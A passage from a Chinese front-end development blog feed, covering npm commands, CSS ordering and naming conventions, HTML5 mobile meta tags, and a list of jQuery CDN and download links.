</code></pre><h2 id="重新启动模块"><a href="#重新启动模块" class="headerlink" title="重新启动模块"></a>重新启动模块</h2><pre><code class="bash">npm restart [-- &lt;args&gt;]
</code></pre><h2 id="更新模块-1"><a href="#更新模块-1" class="headerlink" title="更新模块"></a>更新模块</h2><p>可以安装全局插件</p><pre><code class="bash">npm install -g npm-check-updates
</code></pre><p>查看最新的版本</p><pre><code class="bash">npm-check-updates
ncu # 为上一条指令的缩写
</code></pre><p>升级至最新版本</p><pre><code class="bash">ncu -a
</code></pre><p>在使用下载最新的安装包</p><pre><code class="bash">npm update
</code></pre><p>当然，如果所有包都是最新版本，执行 ncu 后会提示：</p><pre><code class="bash">All dependencies match the latest package versions :)
</code></pre><h2 id="查看包的安装路径"><a href="#查看包的安装路径" class="headerlink" title="查看包的安装路径"></a>查看包的安装路径</h2><blockquote><p>输出 node_modules 的路径，支持 <code>-g</code> 选项。</p></blockquote><pre><code class="bash">$ npm root [-g]
</code></pre><h2 id="管理-npm-的配置路径"><a href="#管理-npm-的配置路径" class="headerlink" title="管理 npm 的配置路径"></a>管理 npm 的配置路径</h2><blockquote><p>对于 config 这块用得最多应该是设置代理，解决 npm 安装一些模块失败的问题</p></blockquote><pre><code class="bash">$ npm config set &lt;key&gt; &lt;value&gt; [-g|--global]
$ npm config delete &lt;key&gt;
$ npm config list
</code></pre><h2 id="查看命令的帮助"><a href="#查看命令的帮助" class="headerlink" title="查看命令的帮助"></a>查看命令的帮助</h2><pre><code class="bash">$ npm help &lt;command&gt;
</code></pre><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><ol><li><code>--save-dev</code> 是你开发时候依赖的东西；<code>--save</code> 是你发布之后还依赖的东西。</li><li><code>--save-optional</code> 是可选依赖，非必下；<code>--save-exact</code> 可以指定精确的版本号，也就是说当发布了新版本，系统不会系在最新版本的模块，只会下载该版本的模块。</li><li><code>npm install</code> 下载依赖时会安装 <code>package.json</code> 中 <code>dependencies</code> 和 <code>devDependencies</code> 里的所有模块。</li><li><code>npm install --save</code> 下载依赖时只会安装 <code>package.json</code> 中 <code>dependencies</code> 里的所有模块。</li><li>比如，你写 <code>ES6</code> 代码，如果你想编译成 <code>ES5</code> 发布那么 <code>babel</code> 就是 <code>devDependencies</code>。</li><li>如果你用了 <code>jQuery</code>，由于发布之后还是依赖 <code>jQuery</code>，所以是 <code>dependencies</code>。</li><li>最常用的还是 <code>npm</code> 中的 <code>--save</code> 和 <code>--save-dev</code> 选项。 <code>--save</code> 和 <code>--save-dev</code> 选项。</li></ol><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> node.js </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Node.js </tag>
            
            <tag> JSON </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSS 代码书写顺序以及代码规范]]></title>
      <url>/2016/08/css-code-writing/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>一个优秀的前端开发人员，在书写 CSS 时必定要注意的重点，而不是随意的书写 CSS，这样会给自己还有他人带来困扰<a id="more"></a></p><h1 id="CSS-文件的编码"><a href="#CSS-文件的编码" class="headerlink" title="CSS 文件的编码"></a>CSS 文件的编码</h1><blockquote><p>表明 CSS 文件的页面编码为 UTF-8。在 CSS 文件的最前面添加如下代码</p></blockquote><p><code>For Example:</code></p><pre><code class="html">@charset &quot;UTF-8&quot;;
</code></pre><h1 id="CSS-书写顺序"><a href="#CSS-书写顺序" class="headerlink" title="CSS 书写顺序"></a>CSS 书写顺序</h1><ul><li>位置属性 {<code>position</code>， <code>top</code>， <code>right</code>， <code>z-index</code>， <code>display</code>， <code>float</code> 等}</li><li>大小 {<code>width</code>， <code>height</code>， <code>padding</code>， <code>margin</code> 等}</li><li>文字系列 {<code>font</code>， <code>line-height</code>， <code>letter-spacing</code>，<code>color</code>，<code>text-align</code> 等}</li><li>背景 {<code>background</code>，<code>border</code> 等}</li><li>其他 {<code>animation</code>， <code>transition</code> 等}</li></ul><p><code>For Example:</code></p><pre><code class="css">/* Low */
.example {
  color: red;
  z-index: -1;
  background-color: #9e0;
  display: inline-block;
  font-size: 1.5em;
}

/* Good */
.example {
  z-index: -1;
  display: inline-block;
  font-size: 1.5em;
  color: red;
  background-color: #9e0;
}
</code></pre><h2 id="利用插件实现自动排序"><a href="#利用插件实现自动排序" class="headerlink" title="利用插件实现自动排序"></a>利用插件实现自动排序</h2><blockquote><p>使用过 Sublime text 的童鞋应该知道有一款插件 <a href="//csscomb.com/">CSScomb</a> 是用来自动排序 CSS 属性的，这是一个不错的偷懒方式，也是加快开发速度的技巧</p></blockquote><h1 id="CSS-书写规范"><a href="#CSS-书写规范" class="headerlink" title="CSS 书写规范"></a>CSS 书写规范</h1><h2 id="使用-CSS-缩写属性"><a href="#使用-CSS-缩写属性" class="headerlink" title="使用 CSS 缩写属性"></a>使用 CSS 缩写属性</h2><blockquote><p>CSS 有些属性是可以缩写的，比如 padding， margin， font 等等，这样精简代码同时又能提高用户的阅读体验。</p></blockquote><p><code>For Example:</code></p><pre><code class="css">/* Low */
.box {
  border-top-style: none;
  font-family: serif;
  font-size: 100%;
  line-height: 1.6;
  padding-bottom: 2em;
  padding-left: 1em;
  padding-right: 1em;
  padding-top: 0;
}

/* Good */
.box {
  border-top: 0;
  font: 100%/1.6 serif;
  padding: 0 1em 2em;
}
</code></pre><h2 id="去掉小数点前的-“0”"><a href="#去掉小数点前的-“0”" class="headerlink" title="去掉小数点前的 “0”"></a>去掉小数点前的 “0”</h2><blockquote><p>若属性的值小于 1，建议去掉小数点前的 “0”</p></blockquote><p><code>For Example:</code></p><pre><code class="css">/* Low */
.box {
  font-size: 0.8em;
}

/* Good */
.box {
  font-size: .8em;
}
</code></pre><h2 id="值为-0-时，去掉单位"><a href="#值为-0-时，去掉单位" class="headerlink" title="值为 0 时，去掉单位"></a>值为 0 时，去掉单位</h2><blockquote><p>若属性的值等于 0 时，建议去掉值后面跟着的单位</p></blockquote><p><code>For Example:</code></p><pre><code class="css">/* Low */
* {
  margin: 0px;
  padding: 0px;
}

/* Good */
* {
  margin: 0;
  padding: 0;
}
</code></pre><h2 id="简写命名"><a href="#简写命名" class="headerlink" title="简写命名"></a>简写命名</h2><blockquote><p>很多用户都喜欢简写类名，但前提是要让人看懂你的命名才能简写哦</p></blockquote><p><code>For Example:</code></p><pre><code class="css">/* Low */
.navigation {
  margin: 0 0 1em 2em;
}

.atr {
  color: #93c;
}

/* Good */
.nav {
  margin: 0 0 1em 2em;
}

.author {
  color: #93c;
}
</code></pre><h2 id="16-进制颜色代码可以缩写"><a href="#16-进制颜色代码可以缩写" class="headerlink" title="16 进制颜色代码可以缩写"></a>16 进制颜色代码可以缩写</h2><blockquote><p>有些颜色代码是可以缩写的，我们就尽量缩写吧，提高用户体验为主，简写规则：同时满足 1、2 相同，3、4 相同，5、6 相同</p></blockquote><p><code>For Example:</code></p><pre><code class="css">/* Low */
.box {
  color: #eebbcc;
}

.font {
  color: #333333;
}

/* Good */
.box {
  color: #ebc;
}

.font {
  color: #333;
}
</code></pre><h1 id="选择器命名规范"><a href="#选择器命名规范" class="headerlink" title="选择器命名规范"></a>选择器命名规范</h1><ul><li>长名称或词组可以使用中横线来为选择器命名</li><li>一律小写避免使用大写，区分于 <code>JS</code> 的函数名</li><li>强制建议使用英文，不使用拼音</li><li><p>不建议使用 <code>_</code> 下划线来命名 <code>CSS</code> 选择器，为什么呢？</p><ul><li>输入的时候少按一个 <code>shift</code> 键；</li><li>浏览器兼容问题 （比如使用 <code>_tips</code> 的选择器命名，在 <code>IE6</code> 是无效的）</li><li>能良好区分 <code>JavaScript</code> 变量命名（<code>JS</code> 变量命名是用 <code>_</code>）</li></ul></li></ul><p><code>For Example:</code></p><pre><code class="css">/* Low */
.maintitle {
  color: #e3c;
}
.main_title {
  color: #e3c;
}

/* Good */
.main-title {
  color: #e3c;
}
</code></pre><h1 id="CSS-选择器最好不要随意使用-id"><a href="#CSS-选择器最好不要随意使用-id" class="headerlink" title="CSS 选择器最好不要随意使用 id"></a>CSS 选择器最好不要随意使用 id</h1><ul><li><code>id</code> 在 <code>JS</code> 是唯一的，不能多次使用，而使用 <code>class</code> 类选择器却可以重复使用</li><li><code>id</code> 的优先级优先与 <code>class</code>，所以 <code>id</code> 应该按需使用，而不能滥用</li><li><code>id</code> 选择器多用于 <code>JS</code> 方法的调用</li></ul><p><code>For Example:</code></p><pre><code class="css">/* Low */
#info-title {
  font-size: 3em;
}

/* Good */
.info-title {
  font-size: 3em;
}
</code></pre><h1 id="为选择器添加前缀"><a href="#为选择器添加前缀" class="headerlink" title="为选择器添加前缀"></a>为选择器添加前缀</h1><ul><li>有时候可以给选择器添加一个表示状态的前缀，让语义更明了</li><li>当你在开发属于自己的 <code>CSS</code> 代码时也可以为你的 <code>CSS</code> 代码添加前缀</li></ul><p><code>For Example:</code></p><pre><code class="css">/* Low */
.whithdrawal {
  background-color: #ccc;
}

.divconent {
  width: 60rem;
  font-family: serif;
  color: #999;
}

.sapninline {
  display: inline-block;
}

/* Good */
.is-whithdrawal {
  background-color: #ccc;
}

.my-div-conent {
  width: 60rem;
  font-family: serif;
  color: #999;
}

.my-sapn-inline {
  display: inline-block;
}
</code></pre><h1 id="命名规范举例"><a href="#命名规范举例" class="headerlink" title="命名规范举例"></a>命名规范举例</h1><ul><li>所有命名一律使用小写</li><li>所有的命名一律使用英文，不使用中文或者拼音</li><li>用 <code>-</code> 代替 <code>_</code>，文件命名时尽量少用 <code>-</code></li><li>文件命名时尽量不使用缩写，除非是一眼就可以看出来该文件是干什么用</li><li>文件命名时，如有该文件的版本号，尽量要跟上，如：jquery-2.1.4.min.js</li><li>引用外部文件时，尽量选择压缩版的文件，这样可以加快网页的加载速度</li></ul><h2 id="常用的-CSS-ID-命名"><a href="#常用的-CSS-ID-命名" class="headerlink" title="常用的 CSS / ID 命名"></a>常用的 CSS / ID 命名</h2><ul><li><strong>header / footer</strong> =&gt; 头部 / 尾部</li><li><strong>content / container</strong> =&gt; 内容</li><li><strong>nav / subnav</strong> =&gt; 导航 / 子导航</li><li><strong>sidebar</strong> =&gt; 侧边栏</li><li><strong>row / column</strong> =&gt; 行 / 列</li><li><strong>top / left / bottom / right</strong> =&gt; 上 / 左 / 下 / 右</li><li><strong>logo</strong> =&gt; 标志</li><li><strong>banner</strong> =&gt; 广告</li><li><strong>main</strong> =&gt; 页面主体</li><li><strong>hot</strong> =&gt; 热点</li><li><strong>news</strong> =&gt; 新闻</li><li><strong>download</strong> =&gt; 下载</li><li><strong>menu / submenu</strong> =&gt; 菜单 / 子菜单</li><li><strong>search</strong> =&gt; 搜索</li><li><strong>friendlink</strong> =&gt; 友情链接</li><li><strong>copyright</strong> =&gt; 版权</li><li><strong>tags</strong> =&gt; 标签</li><li><strong>list</strong> =&gt; 列表</li><li><strong>loginbar</strong> =&gt; 登录条</li><li><strong>msg</strong> =&gt; 提示信息</li><li><strong>status</strong> =&gt; 状态</li></ul><h2 id="常用-CSS-JS-文件命名"><a href="#常用-CSS-JS-文件命名" class="headerlink" title="常用 CSS / JS 文件命名"></a>常用 CSS / JS 文件命名</h2><ul><li><strong>master.css</strong> =&gt; 主要的</li><li><strong>modeule.css</strong> =&gt; 模块</li><li><strong>base.css</strong> =&gt; 基本共用</li><li><strong>base.min.css</strong> =&gt; 基本共用样式表压缩版</li><li><strong>layout.css</strong> =&gt; **布局、版面</li><li><strong>themes.css</strong> =&gt; 主题</li><li><strong>font.css</strong> =&gt; 文字</li><li><strong>from.css</strong> =&gt; 表单</li><li><strong>jquery-ui-1.9.0.js</strong> =&gt; jQuery UI 的脚本，版本为 1.9.0</li><li><strong>jquery.min.js</strong> =&gt; jQuery 压缩版</li><li><strong>base.js</strong> =&gt; 基本共用</li><li><strong>from-ajax.js</strong> =&gt; 通过 Ajax 技术提交的表单</li></ul><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> Criterion </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTML5 移动端头部标签]]></title>
      <url>/2016/08/html5-head-meta/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>记录 HTML5 通用的移动端和 PC 端头部标签，即 meta 标签<a id="more"></a></p><h1 id="定义文档类型和编码习惯"><a href="#定义文档类型和编码习惯" class="headerlink" title="定义文档类型和编码习惯"></a>定义文档类型和编码习惯</h1><pre><code class="html">&lt;!DOCTYPE html&gt; &lt;!-- 使用 HTML5 doctype，不区分大小写 --&gt;
&lt;html lang=&quot;en&quot;&gt; &lt;!-- 更加标准的 lang 属性写法 //zhi.hu/XyIa --&gt;
&lt;head&gt;
  &lt;!-- 声明文档使用的字符编码 --&gt;
  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;body&gt;
&lt;/html&gt;
</code></pre><h1 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h1><pre><code class="html">&lt;!-- 优先使用 IE 最新版本和 Chrome 内核的浏览器--&gt;
&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;

&lt;!-- 为移动设备添加 viewport --&gt;
&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;

&lt;!-- 启用360浏览器的极速模式(webkit) --&gt;
&lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot;&gt;
</code></pre><h1 id="搜索引擎优化"><a href="#搜索引擎优化" class="headerlink" title="搜索引擎优化"></a>搜索引擎优化</h1><pre><code class="html">&lt;!-- 页面描述 --&gt;
&lt;meta name=&quot;description&quot; content=&quot;不超过150个字符&quot;&gt;

&lt;!-- 页面关键词 --&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;

&lt;!-- 网页作者 --&gt;
&lt;meta name=&quot;author&quot; content=&quot;name, email@gmail.com&quot;&gt;

&lt;!-- 搜索引擎抓取 --&gt;
&lt;!-- index：搜索引擎索引此网页;follow：搜索引擎继续通过此网页的链接索引搜索其它的网页。 --&gt;
&lt;!-- 搜索引擎索引方式：通常有如下几种取值：none，noindex，nofollow，all，index和follow。--&gt;
&lt;meta name=&quot;robots&quot; content=&quot;index,follow&quot;&gt;
&lt;!--
    all：文件将被检索，且页面上的链接可以被查询；
    none：文件将不被检索，且页面上的链接不可以被查询；
    index：文件将被检索；
    follow：页面上的链接可以被查询；
    noindex：文件将不被检索；
    nofollow：页面上的链接不可以被查询。
 --&gt;
</code></pre><h1 id="页面缓存设置"><a href="#页面缓存设置" class="headerlink" title="页面缓存设置"></a>页面缓存设置</h1><pre><code class="html">&lt;!-- 清除缓存 --&gt;
&lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt;
&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;
&lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt;
</code></pre><h1 id="移动端字体设置"><a href="#移动端字体设置" class="headerlink" title="移动端字体设置"></a>移动端字体设置</h1><pre><code class="css">/**
中英字体名对照表
宋体      SimSun
黑体      SimHei
微信雅黑   Microsoft Yahei
微软正黑体 Microsoft JhengHei
新宋体    NSimSun
新细明体  MingLiU
细明体    MingLiU
标楷体    DFKai-SB
仿宋     FangSong
楷体     KaiTi
仿宋_GB2312  FangSong_GB2312
楷体_GB2312  KaiTi_GB2312
说明：中文字体多数使用宋雅黑，英文用 Helvetica
*/
body { font-family: Microsoft Yahei,SimSun,Helvetica; }
</code></pre><h1 id="电话号码和邮箱的识别"><a href="#电话号码和邮箱的识别" class="headerlink" title="电话号码和邮箱的识别"></a>电话号码和邮箱的识别</h1><pre><code class="html">&lt;!-- 一般只启用电话号码的识别 --&gt;
&lt;meta name=&quot;format-detection&quot; content=&quot;telphone=yes&quot;&gt;

&lt;!-- 忽略页面中的数字识别为电话，忽略email识别 --&gt;
&lt;meta name=&quot;format-detection&quot; content=&quot;telphone=no, email=no&quot;&gt;

&lt;!-- 启用页面中的数字识别为电话，启用email识别 --&gt;
&lt;meta name=&quot;format-detection&quot; content=&quot;telphone=yes, email=yes&quot;&gt;
</code></pre><h1 id="响应式"><a href="#响应式" class="headerlink" title="响应式"></a>响应式</h1><pre><code class="html">&lt;!-- IOS 中 Safari 允许全屏浏览 --&gt;
&lt;meta name=”apple-mobile-web-app-capable” content=”yes”&gt;

&lt;!-- IOS 隐藏状态栏 --&gt;
&lt;meta name=”apple-mobile-web-app-status-bar-style” content=black”&gt;

&lt;!-- 添加到主屏后的标题（IOS 6 新增） --&gt;
&lt;meta name=&quot;apple-mobile-web-app-title&quot; content=&quot;标题&quot;&gt;

&lt;!-- uc 强制竖屏 --&gt;
&lt;meta name=&quot;screen-orientation&quot; content=&quot;portrait&quot;&gt;

&lt;!-- QQ 强制竖屏 --&gt;
&lt;meta name=&quot;x5-orientation&quot; content=&quot;portrait&quot;&gt;

&lt;!-- UC 强制全屏 --&gt;
&lt;meta name=&quot;full-screen&quot; content=&quot;yes&quot;&gt;

&lt;!-- QQ 强制全屏 --&gt;
&lt;meta name=&quot;x5-fullscreen&quot; content=&quot;true&quot;&gt;

&lt;!-- UC 应用模式 --&gt;
&lt;meta name=&quot;browsermode&quot; content=&quot;application&quot;&gt;

&lt;!-- QQ 应用模式 --&gt;
&lt;meta name=&quot;x5-page-mode&quot; content=&quot;app&quot;&gt;

&lt;!-- 可隐藏地址栏，仅针对 IOS 的 Safari（注：IOS7.0 版本以后，safari上已看不到效果） --&gt;
&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot; /&gt;

&lt;!-- 仅针对 IOS 的 Safari 顶端状态条的样式（可选 default/black/black-translucent ） --&gt;
&lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot; /&gt;

&lt;!-- IOS 中禁用将数字识别为电话号码/忽略 Android 平台中对邮箱地址的识别 --&gt;
&lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no, email=no&quot; /&gt;
</code></pre><h1 id="favicon-icon-图标"><a href="#favicon-icon-图标" class="headerlink" title="favicon icon 图标"></a>favicon icon 图标</h1><pre><code class="html">&lt;!-- 添加 favicon icon --&gt;
&lt;link rel=&quot;shortcut icon&quot; type=&quot;image/ico&quot; href=&quot;/favicon.icon&quot;&gt;

&lt;!-- iOS 图标 begin --&gt;
&lt;!-- iPhone 和 iTouch，默认 57x57 像素，必须有 --&gt;
&lt;link rel=&quot;apple-touch-icon-precomposed&quot; href=&quot;/apple-touch-icon-57x57-precomposed.png&quot;&gt;

&lt;!-- Retina iPhone 和 Retina iTouch，114x114 像素，可以没有，但推荐有 --&gt;
&lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;114x114&quot; href=&quot;/apple-touch-icon-114x114-precomposed.png&quot;&gt;

&lt;!-- Retina iPad，144x144 像素，可以没有，但推荐有 --&gt;
&lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;144x144&quot; href=&quot;/apple-touch-icon-144x144-precomposed.png&quot;&gt;
&lt;!-- iOS 图标 end --&gt;
</code></pre><h1 id="参考模板"><a href="#参考模板" class="headerlink" title="参考模板"></a>参考模板</h1><pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;
  &lt;meta name=”apple-mobile-web-app-capable” content=”yes”&gt;
  &lt;meta name=”apple-mobile-web-app-status-bar-style” content=black”&gt;
  &lt;meta name=&quot;format-detection&quot; content=&quot;telphone=no, email=no&quot;&gt;
  &lt;title&gt;标题&lt;/title&gt;
  &lt;link rel=&quot;stylesheet&quot; herf=&quot;&quot;&gt;
&lt;/head&gt;
&lt;body&gt;
  ...
&lt;/body&gt;
&lt;/html&gt;
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> HTML5 </tag>
            
            <tag> Moblie </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jQuery 各个版本的下载链接]]></title>
      <url>/2016/08/jquery-download-links/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>提供 jQuery 所有版本的下载链接和 CDN 链接<a id="more"></a></p><h1 id="jquery-3-2-0（最新）"><a href="#jquery-3-2-0（最新）" class="headerlink" title="jquery-3.2.0（最新）"></a>jquery-3.2.0（最新）</h1><h2 id="官网-jquery-压缩版引用地址"><a href="#官网-jquery-压缩版引用地址" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-3.2.0.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-3.2.1.zip?attname=" target="_blank" rel="external">jquery-3.2.1.zip</a></p></blockquote><h1 id="jquery-3-0-0"><a href="#jquery-3-0-0" class="headerlink" title="jquery-3.0.0"></a>jquery-3.0.0</h1><h2 id="官网-jquery-压缩版引用地址-1"><a href="#官网-jquery-压缩版引用地址-1" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-3.0.0.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-1"><a href="#下载链接-1" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-3.0.0.zip?attname=" target="_blank" rel="external">jquery-3.0.0.zip</a></p></blockquote><h1 id="jquery-2-1-4"><a href="#jquery-2-1-4" class="headerlink" title="jquery-2.1.4"></a>jquery-2.1.4</h1><blockquote><p>jquery-2.1.4 (注！ jquery-2.0 以上版本不再支持 IE 6/7/8) 百度引用地址 (推荐目前最稳定的，不会出现延时打不开情况)</p></blockquote><h2 id="百度压缩版引用地址"><a href="#百度压缩版引用地址" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/2.1.4/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址"><a href="#微软压缩版引用地址" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-2.1.4.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-2"><a href="#官网-jquery-压缩版引用地址-2" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-2.1.4.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-2"><a href="#下载链接-2" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-2.1.4.zip?attname=" target="_blank" rel="external">jquery-2.1.4.zip</a></p></blockquote><h1 id="jquery-2-1-1"><a href="#jquery-2-1-1" class="headerlink" title="jquery-2.1.1"></a>jquery-2.1.1</h1><h2 id="百度压缩版引用地址-1"><a href="#百度压缩版引用地址-1" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-1"><a href="#微软压缩版引用地址-1" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-2.1.1.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-3"><a href="#官网-jquery-压缩版引用地址-3" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-2.1.1.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-3"><a href="#下载链接-3" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-2.1.1.zip?attname=" target="_blank" rel="external">jquery-2.1.1.zip</a></p></blockquote><h1 id="jquery-2-0-0"><a href="#jquery-2-0-0" class="headerlink" title="jquery-2.0.0"></a>jquery-2.0.0</h1><h2 id="百度压缩版引用地址-2"><a href="#百度压缩版引用地址-2" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/2.0.0/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-2"><a href="#微软压缩版引用地址-2" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-2.0.0.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-4"><a href="#官网-jquery-压缩版引用地址-4" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-2.0.0.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-4"><a href="#下载链接-4" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-2.0.3.zip?attname=" target="_blank" rel="external">jquery-2.0.3.zip</a><br><br><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-2.0.0.zip?attname=" target="_blank" rel="external">jquery-2.0.0.zip</a></p></blockquote><h1 id="jquery-1-11-3"><a href="#jquery-1-11-3" class="headerlink" title="jquery-1.11.3"></a>jquery-1.11.3</h1><h2 id="百度压缩版引用地址-3"><a href="#百度压缩版引用地址-3" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.11.3/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-3"><a href="#微软压缩版引用地址-3" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.11.3.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-5"><a href="#官网-jquery-压缩版引用地址-5" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.11.3.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-5"><a href="#下载链接-5" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.11.3.zip?attname=" target="_blank" rel="external">jquery-1.11.3.zip</a></p></blockquote><h1 id="jquery-1-11-1"><a href="#jquery-1-11-1" class="headerlink" title="jquery-1.11.1"></a>jquery-1.11.1</h1><h2 id="百度压缩版引用地址-4"><a href="#百度压缩版引用地址-4" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.11.1/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-4"><a href="#微软压缩版引用地址-4" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-6"><a href="#官网-jquery-压缩版引用地址-6" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-6"><a href="#下载链接-6" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.11.1.zip?attname=" target="_blank" rel="external">jquery-1.11.1.zip</a></p></blockquote><h1 id="jquery-1-10-2"><a href="#jquery-1-10-2" class="headerlink" title="jquery-1.10.2"></a>jquery-1.10.2</h1><h2 id="百度压缩版引用地址-5"><a href="#百度压缩版引用地址-5" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt;
